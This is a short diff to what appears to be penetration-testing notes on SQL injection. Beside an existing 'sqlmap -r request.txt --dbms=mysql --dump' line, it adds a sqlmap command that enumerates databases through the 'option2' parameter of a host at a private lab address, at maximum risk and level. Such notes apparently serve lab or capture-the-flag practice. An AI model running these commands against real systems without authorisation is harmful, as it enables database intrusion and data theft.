@@ -196,6 +196,7 @@ Intercept a HTML request for which a SQLi vulnerability is possible. Save this r
 
     sqlmap -r request.txt --dbms=mysql --dump
 
+    sqlmap -u "http://10.10.19.115/index.php?option1=com_fields&option2=fields" --risk=3 --level=5 --random-agent --dbs -p option2
 
 
 
